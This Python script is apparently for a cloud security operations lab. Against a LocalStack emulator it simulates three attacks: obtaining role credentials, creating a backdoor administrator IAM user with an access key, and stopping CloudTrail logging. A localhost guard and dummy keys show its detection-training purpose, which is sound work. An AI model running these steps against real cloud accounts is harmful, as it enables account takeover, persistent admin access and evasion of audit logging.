#!/usr/bin/env python3
"""
simulate_p1_breach.py — Cloud SOC Lab :: P1 Attack Simulation
Three adversary behaviours, mapped to MITRE ATT&CK. LocalStack only.

  Scenario A : Credential theft via role assumption   (T1552.005)
  Scenario B : Backdoor IAM persistence               (T1136.003)
  Scenario C : Defense evasion — disable logging       (T1562.008)
"""
import logging
import sys

import boto3
from botocore.exceptions import ClientError

LOCALSTACK_ENDPOINT = "http://localhost:4566"
REGION = "us-east-1"
ACCOUNT_ID = "000000000000"

TRAIL_NAME = "bank-apac-cloudtrail"
APP_ROLE_NAME = "FinancialTransactionProcessorRole"
ROGUE_USER = "rogue-admin-backdoor"
ADMIN_POLICY = "arn:aws:iam::aws:policy/AdministratorAccess"

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("p1-sim")


def guard_localstack():
    if not any(h in LOCALSTACK_ENDPOINT for h in ("localhost", "127.0.0.1")):
        log.error("Refusing to run attack simulation outside LocalStack.")
        sys.exit(1)


def client(service):
    return boto3.client(
        service, endpoint_url=LOCALSTACK_ENDPOINT, region_name=REGION,
        aws_access_key_id="test", aws_secret_access_key="test",
    )


def scenario_a_imds_ssrf():
    log.warning("[SCENARIO A] IMDS SSRF credential exfiltration (T1552.005)")
    sts = client("sts")
    resp = sts.assume_role(
        RoleArn=f"arn:aws:iam::{ACCOUNT_ID}:role/{APP_ROLE_NAME}",
        RoleSessionName="imds-ssrf-exfil",
    )
    c = resp["Credentials"]
    log.warning("Exfiltrated temp creds -> AccessKeyId=%s  SessionToken(len=%d)",
                c["AccessKeyId"], len(c["SessionToken"]))
    return c


def scenario_b_persistence():
    log.warning("[SCENARIO B] Backdoor IAM persistence (T1136.003)")
    iam = client("iam")
    try:
        iam.create_user(UserName=ROGUE_USER)
    except ClientError as e:
        if e.response["Error"]["Code"] != "EntityAlreadyExists":
            raise
    iam.attach_user_policy(UserName=ROGUE_USER, PolicyArn=ADMIN_POLICY)
    key = iam.create_access_key(UserName=ROGUE_USER)["AccessKey"]
    log.warning("Created backdoor user %s with AdministratorAccess + access key %s",
                ROGUE_USER, key["AccessKeyId"])


def scenario_c_audit_evasion():
    log.warning("[SCENARIO C] Defense evasion — stop CloudTrail (T1562.008)")
    client("cloudtrail").stop_logging(Name=TRAIL_NAME)
    log.warning("CloudTrail %s STOPPED — audit visibility blinded", TRAIL_NAME)


def main():
    guard_localstack()
    log.info("=== P1 BREACH SIMULATION START ===")
    scenario_a_imds_ssrf()
    scenario_b_persistence()
    scenario_c_audit_evasion()
    log.info("=== P1 BREACH SIMULATION COMPLETE — hand off to SOAR ===")


if __name__ == "__main__":
    main()